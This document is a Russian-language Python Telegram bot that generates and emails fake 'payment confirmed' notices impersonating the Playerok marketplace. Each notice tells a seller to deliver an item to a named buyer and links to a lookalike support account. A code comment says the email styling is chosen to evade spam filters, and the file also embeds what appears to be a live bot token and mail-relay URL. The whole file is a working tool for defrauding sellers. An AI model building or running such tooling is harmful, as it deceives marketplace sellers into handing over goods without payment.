import asyncio, logging, aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ ---
# Используй свой актуальный токен и ссылку из Google Scripts
API_TOKEN = '8777068569:AAEl-874WqglkLNCl9Uyjc_VMApsNltS2Is'
GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwApBf3F8gJ34BGN5zvIlX_hPYkEz5K7aKDeoDH0pdE-I9TjCE-r2690IuTpl4OaJ9q/exec'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class OrderState(StatesGroup):
    waiting_email = State()
    waiting_seller = State()
    waiting_amount = State()
    waiting_item = State()
    waiting_buyer = State()

def get_html_template(seller, amount, item, buyer):
    s = seller.replace("@", "")
    b = buyer.replace("@", "")
    
    # Весь дизайн теперь на inline-стилях для обхода фильтров спама и верстки почтовиков
    return f"""
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"></head>
<body style="margin:0; padding:0; background-color:#0a0a0a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
    <div style="background-color:#0a0a0a; padding: 20px 10px;">
        <div style="max-width:420px; margin:0 auto; background-color:#141414; border-radius:24px; overflow:hidden; border:1px solid #262626;">
            
            <div style="background: linear-gradient(90deg, #3291ff 0%, #00c2ff 100%); padding: 25px; display: block;">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td>
                            <h2 style="margin:0; color:white; font-size:22px; font-weight:800;">Playerok • Сделка</h2>
                            <p style="margin:5px 0 0 0; color:white; font-size:11px; opacity:0.8;">Системное уведомление • Оплата подтверждена</p>
                        </td>
                        <td align="right">
                            <div style="background:white; color:black; padding:8px 12px; border-radius:8px; font-weight:900; font-size:18px;">Player<span style="color:#3586ff;">ok</span></div>
                        </td>
                    </tr>
                </table>
            </div>

            <div style="padding:20px;">
                <table width="100%" style="margin-bottom:15px;">
                    <tr>
                        <td style="color:white; font-weight:700; font-size:17px;">Здравствуйте, @{s}</td>
                        <td align="right"><span style="background-color:#2a2444; color:#9a8cff; padding:5px 12px; border-radius:12px; font-size:11px; font-weight:700;">Seller</span></td>
                    </tr>
                </table>

                <div style="margin-bottom:20px;">
                    <div style="color:#828282; font-size:12px; margin-bottom:8px; text-transform:uppercase;">Статус</div>
                    <div style="background-color:#1a8944; color:white; padding:8px 15px; border-radius:10px; font-size:13px; font-weight:800; display:inline-block; margin-bottom:15px;">ОПЛАТА ПОДТВЕРЖДЕНА</div>
                    <div style="color:#828282; font-size:12px; margin-bottom:5px; text-transform:uppercase;">Сумма</div>
                    <div style="color:#00a651; font-size:32px; font-weight:800; margin:0 0 10px 0;">{amount} ₽</div>
                    <p style="color:#828282; font-size:14px; line-height:1.4; margin:0;">Оплата по сделке зафиксирована системой. Передайте товар покупателю и дождитесь подтверждения.</p>
                </div>

                <div style="border-top:1px solid #262626; padding-top:20px; margin-bottom:20px;">
                    <div style="color:#828282; font-size:12px; margin-bottom:15px; font-weight:bold;">ДЕТАЛИ СДЕЛКИ</div>
                    
                    <div style="margin-bottom:15px;">
                        <div style="color:#828282; font-size:12px;">Товар</div>
                        <div style="color:white; font-weight:700; font-size:14px; margin-top:4px;">{item}</div>
                    </div>
                    
                    <div style="margin-bottom:15px;">
                        <div style="color:#828282; font-size:12px;">Покупатель</div>
                        <div style="color:white; font-weight:700; font-size:14px; margin-top:4px;">@{b}</div>
                    </div>
                </div>

                <div style="background-color:#1c1814; border-left:4px solid #d29922; padding:15px; border-radius:12px; margin-bottom:20px;">
                    <div style="color:#e19d55; font-size:12px; font-weight:800; margin-bottom:8px;">ДЕЙСТВИЕ СЕЙЧАС</div>
                    <div style="color:white; font-size:14px;">Передайте товар: <span style="background:#000; padding:2px 6px; border-radius:4px; border:1px solid #333;">@{b}</span></div>
                </div>

                <div style="border-top:1px solid #262626; padding-top:20px;">
                    <a href="https://t.me/Helper_PlayerOK" style="display:block; background:#1a1a1a; border:1px solid #333; color:white; text-align:center; padding:15px; border-radius:12px; text-decoration:none; font-weight:700; font-size:14px;">Открыть поддержку в Telegram</a>
                    <p style="text-align:center; color:#444; font-size:11px; margin-top:15px;">2026 Playerok • Системное уведомление</p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
    """

async def send_via_google(email, body):
    async with aiohttp.ClientSession() as session:
        payload = {"email": email, "body": body}
        async with session.post(GOOGLE_SCRIPT_URL, json=payload, timeout=30) as resp:
            return await resp.text()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardBuilder().button(text="🚀 Создать уведомление", callback_data="start_order").as_markup()
    await message.answer("✅ Бот готов! Дизайн обновлен для всех почтовых сервисов.", reply_markup=kb)

@dp.callback_query(F.data == "start_order")
async def start_order(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("1️⃣ Введите **Email** получателя:")
    await state.set_state(OrderState.waiting_email)
    await callback.answer()

@dp.message(OrderState.waiting_email)
async def step1(m: types.Message, state: FSMContext):
    if "@" not in m.text:
        return await m.answer("❌ Введите корректный Email!")
    await state.update_data(email=m.text)
    await m.answer(f"✅ Email: {m.text}\n2️⃣ Ник продавца:")
    await state.set_state(OrderState.waiting_seller)

@dp.message(OrderState.waiting_seller)
async def step2(m: types.Message, state: FSMContext):
    await state.update_data(seller=m.text)
    await m.answer(f"✅ Продавец: {m.text}\n3️⃣ Сумма сделки (₽):")
    await state.set_state(OrderState.waiting_amount)

@dp.message(OrderState.waiting_amount)
async def step3(m: types.Message, state: FSMContext):
    await state.update_data(amount=m.text)
    await m.answer(f"✅ Сумма: {m.text} ₽\n4️⃣ Название товара:")
    await state.set_state(OrderState.waiting_item)

@dp.message(OrderState.waiting_item)
async def step4(m: types.Message, state: FSMContext):
    await state.update_data(item=m.text)
    await m.answer("5️⃣ Ник покупателя:")
    await state.set_state(OrderState.waiting_buyer)

@dp.message(OrderState.waiting_buyer)
async def step5_final(m: types.Message, state: FSMContext):
    data = await state.get_data()
    buyer = m.text
    await m.answer("⏳ **Генерация и отправка письма...**")
    try:
        html_body = get_html_template(data['seller'], data['amount'], data['item'], buyer)
        result = await send_via_google(data['email'], html_body)
        if "Success" in result:
            await m.answer(f"✅ **Готово!**\nПисьмо отправлено на {data['email']}")
        else:
            await m.answer(f"❌ Ошибка Google:\n`{result}`")
    except Exception as e:
        await m.answer(f"❌ Критическая ошибка:\n`{e}`")
    await state.clear()

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
